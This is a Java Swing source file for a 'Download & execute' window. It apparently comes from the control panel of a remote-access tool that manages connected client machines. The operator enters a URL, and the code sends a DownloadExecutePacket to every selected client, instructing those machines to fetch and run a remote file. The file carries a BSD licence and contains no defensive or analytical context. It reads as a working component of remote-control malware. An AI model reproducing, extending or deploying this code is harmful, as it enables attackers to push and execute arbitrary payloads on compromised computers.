/*
 * Copyright (c) 2021, 7ctx <https://github.com/7ctx/> 
 * Email: <7ctx@mail.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this
 *    list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright notice,
 *    this list of conditions and the following disclaimer in the documentation
 *    and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
 * DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE FOR
 * ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
 * (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
 * LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */
package com.ctx.server.ui.impl;

import com.ctx.server.ChannelHandler;
import com.protocol.packets.impl.DownloadExecutePacket;
import io.netty.channel.ChannelId;
import java.util.Set;
import javax.swing.JOptionPane;
import lombok.extern.slf4j.Slf4j;

@Slf4j
public class DownloadExecuteUI extends javax.swing.JFrame
{
    private javax.swing.JButton downloadButton;
    private javax.swing.JTextField downloadUrlTextField;
    private final Set<ChannelId> selectedClients;
    
    public DownloadExecuteUI(Set<ChannelId> selectedClients) 
    {
        this.selectedClients = selectedClients;
        initComponents();
    }
    
    private void initComponents() 
    {
        downloadUrlTextField = new javax.swing.JTextField();
        downloadButton = new javax.swing.JButton();

        setTitle("Download & execute");
        setResizable(false);
        setAlwaysOnTop(true);
        setIconImage(getToolkit().getImage(getClass().getResource("/icons/7.png")));
        setDefaultCloseOperation(javax.swing.WindowConstants.DISPOSE_ON_CLOSE);
        downloadUrlTextField.setText("http://websiteurl.com");

        downloadButton.setText("Download");
        downloadButton.addActionListener((java.awt.event.ActionEvent evt) -> 
        {
         String url = downloadUrlTextField.getText();
         
         if (url == null) 
         {
             log.error("Download url == null");
             return;
         }
         
                int option = JOptionPane.showConfirmDialog(rootPane, "Are you sure you want to Download: " + url + " for " + selectedClients.toString());
                if (option != 0) 
                {
                    return;
                }
                
            DownloadExecutePacket packet = new DownloadExecutePacket();
            packet.setUrl(url);
            for (ChannelId channelId : selectedClients)
            {
                ChannelHandler.writePacket(channelId, packet);
            }
            this.dispose();
        });
        
        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(downloadUrlTextField, javax.swing.GroupLayout.PREFERRED_SIZE, 147, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(downloadButton)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(downloadUrlTextField, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(downloadButton, javax.swing.GroupLayout.PREFERRED_SIZE, 18, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        pack();
    }               
}
